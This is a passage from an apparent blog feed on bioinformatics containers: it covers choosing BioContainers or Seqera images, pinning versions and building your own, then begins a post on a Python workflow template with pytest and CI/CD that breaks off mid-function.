<p><img decoding="async" loading="lazy" alt="seqera_container" src="https://riverxdata.github.io/river-docs/assets/images/seqera_container_registry-12220fdc32c49ac10d1a2a5ac24b2b8f.png" width="2546" height="1494" class="img_ev3q">
<strong>Advantages:</strong></p>
<ul>
<li class="">✅ Combines multiple tools in one image</li>
<li class="">✅ Modern infrastructure</li>
<li class="">✅ Web interface for easy discovery</li>
<li class="">✅ Automatic lock file generation</li>
<li class="">✅ Multi-architecture support</li>
</ul>
<p><strong>Limitations:</strong></p>
<ul>
<li class="">Fewer pre-built combinations than BioContainers</li>
<li class="">Relies on Seqera infrastructure</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-when-to-build-from-scratch">3. When to Build from Scratch<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#3-when-to-build-from-scratch" class="hash-link" aria-label="Direct link to 3. When to Build from Scratch" title="Direct link to 3. When to Build from Scratch" translate="no">​</a></h3>
<p>Only build your own container if:</p>
<ol>
<li class=""><strong>Tool doesn't exist</strong> in any public registry</li>
<li class=""><strong>Version not available</strong> and you need an older/newer version</li>
<li class=""><strong>Custom modifications</strong> required (additional dependencies, scripts)</li>
<li class=""><strong>Performance optimizations</strong> needed for specific hardware</li>
</ol>
<p><strong>Example scenario:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check if tool exists</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/myraretool:latest  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ❌ Not found</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check Seqera Containers</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Visit https://seqera.io/containers/ - (tool not found)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># → NOW you build it yourself using Section 4 approach</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> build </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> myregistry.com/myraretool:1.0 </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> push myregistry.com/myraretool:1.0</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="quick-reference-where-to-find-each-tool">Quick Reference: Where to Find Each Tool<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#quick-reference-where-to-find-each-tool" class="hash-link" aria-label="Direct link to Quick Reference: Where to Find Each Tool" title="Direct link to Quick Reference: Where to Find Each Tool" translate="no">​</a></h3>
<table><thead><tr><th>Tool Type</th><th>Primary Location</th><th>Alternative</th><th>Fallback</th></tr></thead><tbody><tr><td><strong>Common bioinformatics</strong> (FastQC, SAMtools, BWA, etc.)</td><td><a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a></td><td><a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a></td><td>Build yourself</td></tr><tr><td><strong>R/Bioconductor packages</strong></td><td><a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a></td><td><a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a></td><td>Build yourself</td></tr><tr><td><strong>Python bioinformatics</strong></td><td><a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a></td><td><a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a></td><td>Build yourself</td></tr><tr><td><strong>Specialized tools</strong></td><td><a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a> first</td><td>GitHub releases</td><td>Build yourself</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="practical-workflow-search--pull--use">Practical Workflow: Search → Pull → Use<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#practical-workflow-search--pull--use" class="hash-link" aria-label="Direct link to Practical Workflow: Search → Pull → Use" title="Direct link to Practical Workflow: Search → Pull → Use" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Search for tool in BioContainers</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">TOOL</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"fastqc"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">VERSION</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"0.12.1"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Searching for </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$TOOL</span><span class="token string" style="color:hsl(119, 34%, 47%)">:</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$VERSION</span><span class="token string" style="color:hsl(119, 34%, 47%)"> in BioContainers..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$TOOL</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$VERSION</span><span class="token plain">--* </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">/dev/null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"✓ Found in BioContainers!"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exit</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Try Seqera Containers</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Trying Seqera Containers..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># (Check https://seqera.io/containers/ manually or via API)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Build yourself</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"✗ Not found in public registries. Building from scratch..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use Section 4 approach with Micromamba or Pixi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> build </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> myregistry.com/</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$TOOL</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$VERSION</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="best-practices-for-using-pre-built-containers">Best Practices for Using Pre-Built Containers<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#best-practices-for-using-pre-built-containers" class="hash-link" aria-label="Direct link to Best Practices for Using Pre-Built Containers" title="Direct link to Best Practices for Using Pre-Built Containers" translate="no">​</a></h3>
<ol>
<li class="">
<p><strong>Pin exact versions:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">✓ Good: </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/samtools:1.18--hd87286a_0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">✗ Bad:  </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/samtools:latest</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>Check build hash in Nextflow:</strong></p>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process myTask </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Include digest for reproducibility</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container </span><span class="token string" style="color:hsl(119, 34%, 47%)">'quay.io/biocontainers/samtools:1.18--hd87286a_0@sha256:abc123...'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'samtools view input.bam'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>Keep local cache for offline work:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/samtools:1.18--hd87286a_0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> tag quay.io/biocontainers/samtools:1.18--hd87286a_0 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    myregistry.com/samtools:1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> push myregistry.com/samtools:1.18</span><br></span></code></pre></div></div>
</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="summary-container-registry-decision-tree">Summary: Container Registry Decision Tree<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#summary-container-registry-decision-tree" class="hash-link" aria-label="Direct link to Summary: Container Registry Decision Tree" title="Direct link to Summary: Container Registry Decision Tree" translate="no">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Do you need a bioinformatics tool in a container?</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├─→ Search https://biocontainers.pro/registry (BioContainers)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├─→ Found? Use it ✓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └─→ Not found?</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       ├─→ Search https://seqera.io/containers/ (Seqera Containers)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │   ├─→ Found? Use it ✓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │   └─→ Not found?</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │       │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │       └─→ Build using Section 4</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │           (Micromamba or Pixi) ✓</span><br></span></code></pre></div></div>
<p><strong>Key Takeaway:</strong></p>
<ul>
<li class=""><strong>Check existing registries first</strong> - saves time and uses community-maintained containers</li>
<li class=""><strong>BioContainers (<a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a>) is your first stop</strong> - most comprehensive bioinformatics registry</li>
<li class=""><strong>Seqera (<a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a>) for multi-tool combinations</strong> - modern approach for complex workflows</li>
<li class=""><strong>Build yourself only as last resort</strong> - but you now have the tools (Section 4) to do it well</li>
</ul>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="docker" term="docker"/>
        <category label="bioinformatics" term="bioinformatics"/>
        <category label="bioconda" term="bioconda"/>
        <category label="nextflow" term="nextflow"/>
        <category label="best-practices" term="best-practices"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Bioinformatics Workflow Template: Standardizing Python Pipelines with Modular Design]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices</id>
        <link href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices"/>
        <updated>2026-02-04T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Building reproducible bioinformatics pipelines is hard. Every project starts from scratch with its own testing, CI/CD, and deployment strategy. What if you could clone a template, add your analysis tools, and be ready to go?]]></summary>
        <content type="html"><![CDATA[<p>Building reproducible bioinformatics pipelines is hard. Every project starts from scratch with its own testing, CI/CD, and deployment strategy. <strong>What if you could clone a template, add your analysis tools, and be ready to go?</strong></p>
<p>This post introduces a <strong>standardized bioinformatics workflow template</strong> featuring consistent testing, CI/CD, and project structure. Developed from real production experience with <code>bioinfor-wf-template</code>, this template reduces setup time from days to minutes, ensures research reproducibility, and promotes modular, reusable code. It is Python-based and ideal for proof-of-concept projects. Support for more advanced and widely adopted bioinformatics frameworks (such as Snakemake and Nextflow) is planned, applying the same core principles while leveraging their native testing systems.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-problem-bioinformatics-projects-start-from-zero">The Problem: Bioinformatics Projects Start From Zero<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#the-problem-bioinformatics-projects-start-from-zero" class="hash-link" aria-label="Direct link to The Problem: Bioinformatics Projects Start From Zero" title="Direct link to The Problem: Bioinformatics Projects Start From Zero" translate="no">​</a></h2>
<p>Most bioinformatics projects face similar challenges:</p>
<p><strong>No Standard Structure</strong></p>
<ul>
<li class="">Where do I put my scripts? <code>src/</code>? <code>bin/</code>? <code>scripts/</code>?</li>
<li class="">How do I organize apps vs workflows?</li>
<li class="">Where do tests go?</li>
</ul>
<p><strong>Testing Nightmare</strong></p>
<ul>
<li class="">Unit tests for data validation</li>
<li class="">End-to-end (E2E) tests with real data</li>
<li class="">Different frameworks need different test approaches</li>
<li class="">Docker container testing</li>
</ul>
<p><strong>CI/CD Inconsistency</strong></p>
<ul>
<li class="">Each project has its own GitHub Actions workflow</li>
<li class="">No standard for running tests on changes</li>
<li class="">Hard to scale to 50+ apps and workflows</li>
</ul>
<p><strong>Onboarding Friction</strong></p>
<ul>
<li class="">New team members spend days setting up</li>
<li class="">"How do I run the tests?" → No clear answer</li>
<li class="">"Where's the documentation?" → Scattered or missing</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-solution-standardized-template">The Solution: Standardized Template<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#the-solution-standardized-template" class="hash-link" aria-label="Direct link to The Solution: Standardized Template" title="Direct link to The Solution: Standardized Template" translate="no">​</a></h2>
<p>Introducing a <strong>production-ready bioinformatics workflow template</strong> with:</p>
<ul>
<li class="">✅ Clear project structure for apps, workflows, and tests</li>
<li class="">✅ Unified testing framework (pytest) for all modules</li>
<li class="">✅ Smart CI/CD that only runs tests for changed files</li>
<li class="">✅ Docker integration for reproducible environments</li>
<li class="">✅ One-command local testing with <code>act</code></li>
<li class="">✅ Type hints and validation for data integrity</li>
<li class="">✅ Scales from 5 apps to 50+ production pipelines</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-1-understanding-the-template-structure">Part 1: Understanding the Template Structure<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#part-1-understanding-the-template-structure" class="hash-link" aria-label="Direct link to Part 1: Understanding the Template Structure" title="Direct link to Part 1: Understanding the Template Structure" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="repository-layout">Repository Layout<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#repository-layout" class="hash-link" aria-label="Direct link to Repository Layout" title="Direct link to Repository Layout" translate="no">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bioinfor-wf-template/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── apps/                          # Individual bioinformatics tools</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── fastqc/                    # Quality control</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── main.py                # Implementation</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── tests/                 # Unit + E2E tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   │   ├── test_fastq_in_pairs.py      # Unit tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   │   └── test_e2e.py                 # Integration tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   └── Makefile               # Local testing commands</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── multiqc/                   # Aggregation</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── main.py</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── tests/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   └── Makefile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └── [your-tool]/               # Add more tools</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── workflows/                      # Composed pipelines</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── qc/                        # Quality control workflow</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── main.py                # Orchestrates apps</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── tests/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   └── Makefile</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └── [your-pipeline]/           # Add more workflows</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── .github/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └── workflows/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       └── tests.yaml             # GitHub Actions CI/CD</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── conftest.py                    # Shared pytest configuration</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── pytest.ini                     # Pytest settings</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── requirements.txt               # Dependencies</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── pixi.toml                      # (Optional) Reproducible environment</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">└── README.md</span><br></span></code></pre></div></div>
<p><strong>Key insight</strong>: Apps are reusable building blocks, workflows compose them into pipelines.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-app-fastqc-quality-control">Example App: FastQC Quality Control<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#example-app-fastqc-quality-control" class="hash-link" aria-label="Direct link to Example App: FastQC Quality Control" title="Direct link to Example App: FastQC Quality Control" translate="no">​</a></h3>
<p><strong>apps/fastqc/main.py</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">validate_fastq_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Validate paired FASTQ files match naming convention."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    base1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">basename</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    base2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">basename</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    expected_base2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> base1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"_R1_"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"_R2_"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> base2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!=</span><span class="token plain"> expected_base2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" 